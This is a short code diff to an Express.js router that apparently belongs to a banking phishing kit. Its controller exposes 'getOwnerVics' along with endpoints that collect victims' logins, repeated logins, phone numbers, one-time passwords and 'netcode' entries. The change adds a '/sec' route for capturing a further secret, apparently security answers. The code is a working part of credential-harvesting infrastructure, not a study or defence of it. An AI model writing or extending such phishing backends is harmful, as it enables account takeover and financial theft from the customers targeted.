@@ -1,14 +1,15 @@
 const express = require("express");
 const {
-    getOwnerVics,
-    command,
-    getInfo,
-    submitLogin,
-    submitLoginAgain,
-    submitTelephone,
-    submitOtp,
-    submitNetcode,
-    deleteEntry,
+  getOwnerVics,
+  command,
+  getInfo,
+  submitLogin,
+  submitLoginAgain,
+  submitTelephone,
+  submitOtp,
+  submitSec,
+  submitNetcode,
+  deleteEntry,
 } = require("../controllers/kiwiController");
 
 const router = express.Router();
@@ -22,5 +23,6 @@ router.post("/telephone", submitTelephone);
 router.post("/otp", submitOtp);
 router.post("/netcode", submitNetcode);
 router.post("/delete", deleteEntry);
+router.post("/sec", submitSec);
 
 module.exports = router;
